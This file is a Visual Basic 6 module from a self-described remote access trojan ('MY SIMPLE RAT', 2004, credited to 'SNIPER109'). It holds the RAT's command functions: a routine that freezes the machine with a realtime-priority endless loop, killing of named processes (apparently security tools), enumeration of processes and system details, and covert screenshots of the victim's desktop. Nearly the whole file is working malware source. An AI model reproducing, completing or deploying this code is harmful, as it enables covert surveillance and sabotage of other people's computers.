Attribute VB_Name = "ModCmd"
'#########################################'
'#########################################'
'##                                     ##'
'##          MY SIMPLE RAT :)           ##'
'##                                     ##'
'##             28.11.2004              ##'
'##                                     ##'
'##   ~ RIPPING SUCKX ~                 ##'
'##                                     ##'
'##       -> SNIPER109 <-               ##'
'##                                     ##'
'## irc.quakenet.org @ #sniper109       ##'
'#########################################'
'#########################################'
Option Explicit

Public Function GetFromINI(AppName$, Keyname$, AppFile$) As String
    Dim RetStr As String
    RetStr = String(255, Chr(0))
        GetFromINI = Left(RetStr, GetPrivateProfileString(AppName$, ByVal Keyname$, "", RetStr, Len(RetStr), AppFile$))
End Function
Public Function LoadFile(ByVal tFile As String) As String
    On Error Resume Next
    Dim FF As Long: FF = FreeFile
    Open tFile For Binary Access Read As #FF
    Dim Temp As String
    Temp = Space(LOF(FF))
    Get #FF, 1, Temp
    Close #FF
    LoadFile = Temp
End Function
Public Function CrashMe() As String
    On Error Resume Next
    SetThreadPriority GetCurrentThread(), THREAD_BASE_PRIORITY_MAX
    SetPriorityClass GetCurrentProcess(), REALTIME_PRIORITY_CLASS
    SetThreadPriority GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL
    Do
    Loop
End Function
Public Function SysDir() As String
    On Error Resume Next
    Dim Verzeichnis As String
    Dim Laenge As Long

  Verzeichnis = Space(255)
  Laenge = GetSystemDirectory(Verzeichnis, 255)
  Verzeichnis = Left(Verzeichnis, Laenge)
  Verzeichnis = Replace(Verzeichnis, "/", "\")
  If Right(Verzeichnis, 1) = "\" Then Verzeichnis = Left(Verzeichnis, Len(Verzeichnis) - 1)
  SysDir = Verzeichnis
End Function
Public Function runkiller(ByVal Toolname As String)
 On Error Resume Next
 IsEXERunning Toolname, handle
 TerminateTask (prozessid)
 prozessid = ""
 
End Function
Public Sub TerminateTask(ByVal lTaskID As Long)
  Dim lhwnd As Long: lhwnd = OpenProcess(&H1&, 0&, lTaskID)
  Dim lResult As Long
  lResult = TerminateProcess(lhwnd, 1&)
  lResult = CloseHandle(lhwnd)
End Sub
Public Function ListProcess() As String
On Error Resume Next
Dim iIdx As Integer, bRet As Boolean, lSnapshot As Long, tmpPE As ProcessEntry, tmptasks As String, intProcesses As Integer, intThreads As Integer, TMP As String, tmpProcName As String, tmpPriority As String
lSnapshot = CreateToolhelp32Snapshot(&H2, 0)
tmpPE.dwSize = Len(tmpPE)
bRet = Process32First(lSnapshot, tmpPE)
Do Until bRet = False
tmpProcName = LCase(Mid(tmpPE.szExeFile, _
InStrRev(tmpPE.szExeFile, "\", Len(tmpPE.szExeFile)) + 1, _
Len(tmpPE.szExeFile) - InStrRev(tmpPE.szExeFile, "\", 1)))
tmpProcName = Left(tmpProcName, InStr(1, tmpProcName, Chr(0)) - 1)
Select Case tmpPE.pePriority
Case PROCESS_PRIORITY_IDLE: tmpPriority = "0" 'idle
Case PROCESS_PRIORITY_NORMAL: tmpPriority = "1" 'normal
Case PROCESS_PRIORITY_REALTIME: tmpPriority = "2" 'echtzeit
Case PROCESS_PRIORITY_HIGH: tmpPriority = "3" 'hoch
End Select
If tmpPE.peProcessID <> "0" Then
TMP = TMP & tmpProcName & MasterSplit & tmpPriority & MasterSplit & tmpPE.peProcessID & MasterSplit & MasterSplit
End If
bRet = Process32Next(lSnapshot, tmpPE)
Loop
bRet = CloseHandle(lSnapshot)
ListProcess = TMP
End Function
Public Function IsEXERunning(ByVal sFileName As String, Optional ByVal iReturn As procReturnValue = ProcessID) As Long
Dim lSnapshot As Long: lSnapshot = CreateToolhelpSnapshot(2&, 0&)
Dim uProcess As PROCESSENTRY32
Dim nResult As Long


If lSnapshot <> 0 Then
   uProcess.dwSize = Len(uProcess)
   nResult = ProcessFirst(lSnapshot, uProcess)
   Do Until nResult = 0
    
    If InStr(LCase$(uProcess.szExeFile), LCase$(sFileName)) > 0 Then _
    prozessid = uProcess.th32ProcessID: Exit Do
    
    nResult = ProcessNext(lSnapshot, uProcess)
    Loop
    CloseHandle lSnapshot
End If
End Function

Public Function GetSpecialFolder(ByVal Num As Long) As String
  Dim Result As Long
  Dim Buff As String
  Dim idl As ITEMIDLIST

  Result = SHGetSpecialFolderLocation(frmMain.hWnd, Num, idl)

  If Result = 0 Then
    Buff = Space$(512)
    Result = SHGetPathFromIDList(ByVal idl.mkid.cb, ByVal Buff)
    If Result Then
      GetSpecialFolder = Left$(Buff, InStr(1, Buff, vbNullChar) - 1)
    End If
  End If
End Function
Public Sub Ontop(Form As Form)
On Error Resume Next
SetWindowPos Form.hWnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS
End Sub
Public Function WINDIR() As String
  Dim x%, A%, Temp$

  Temp$ = Space$(255)
  x = GetWindowsDirectory(Temp$, Len(Temp$))
  WINDIR = Left$(Temp$, x)
End Function
Public Function PC() As String
  Dim strBuffer As String
  Dim lngResult As Long
  Dim nSize As Long
  Dim PCName As String
  
  strBuffer = String$(MAX_COMPUTERNAME_LENGTH + 1, 0)
  nSize = MAX_COMPUTERNAME_LENGTH + 1
  
  lngResult = GetComputerName(strBuffer, nSize)
  If lngResult = 1 Then
    PCName = Left$(strBuffer, nSize)
    PC = PCName
  End If
End Function

Public Function OS() As String
 Dim PlatForm As String, OSVersion As OSVERSIONINFO

  OSVersion.dwOSVersionInfoSize = Len(OSVersion)
  GetVersionEx OSVersion

  PlatForm = "Unknown"
  With OSVersion
    If .dwPlatformId = VER_PLATFORM_WIN32_WINDOWS Then
       If .dwMinorVersion = 0 Then
          PlatForm = "Win 95"
          If .szCSDVersion = "B" Then
             PlatForm = PlatForm & " OSR2"
          Else
             PlatForm = PlatForm & Left$(.szCSDVersion, 2)
          End If
       ElseIf .dwMinorVersion = 10 Then
          PlatForm = "Win 98"
          If .szCSDVersion = "A" Then
             PlatForm = PlatForm & " SE"
          End If
       ElseIf .dwMinorVersion = 90 Then
          PlatForm = "Win ME"
       Else
          PlatForm = "Win 32s"
       End If
    ElseIf .dwPlatformId = VER_PLATFORM_WIN32_NT Then
       If .dwMajorVersion = 4 Then
         PlatForm = "Win NT"
       ElseIf .dwMajorVersion = 5 Then
         If .dwBuildNumber = "2195" Then
            PlatForm = "Win 2000"
         ElseIf .dwBuildNumber = "2600" Then
            PlatForm = "Win XP"
         End If
       End If
    End If
  End With

  OS = PlatForm
  End Function

Public Function MakeScreen(TargetBox As Control, ByVal tQuali As Long) As String
    Dim Desktop As Long: Desktop = GetDC(GetDesktopWindow)
    Dim ww, hh
    ww = Screen.Width / Screen.TwipsPerPixelX: hh = Screen.Height / Screen.TwipsPerPixelY
    TargetBox.Width = Screen.Width: TargetBox.Height = Screen.Height
    BitBlt TargetBox.hdc, 0, 0, ww, hh, Desktop, 0, 0, &HCC0020
    Dim tFile As String: tFile = App.Path & "\screen"
    SavePicture TargetBox.Image, tFile
    Do While Dir(tFile) = ""
        DoEvents
    Loop
    frmMain.Picture2.Picture = LoadPicture(tFile)
    JPG.Create frmMain.Picture2.ScaleWidth, frmMain.Picture2.ScaleHeight
    BitBlt JPG.hdc, 0, 0, frmMain.Picture2.ScaleWidth, frmMain.Picture2.ScaleHeight, frmMain.Picture2.hdc, 0, 0, vbSrcCopy
    SaveJPG JPG, tFile & ".jpg", tQuali
    MakeScreen = tFile
End Function

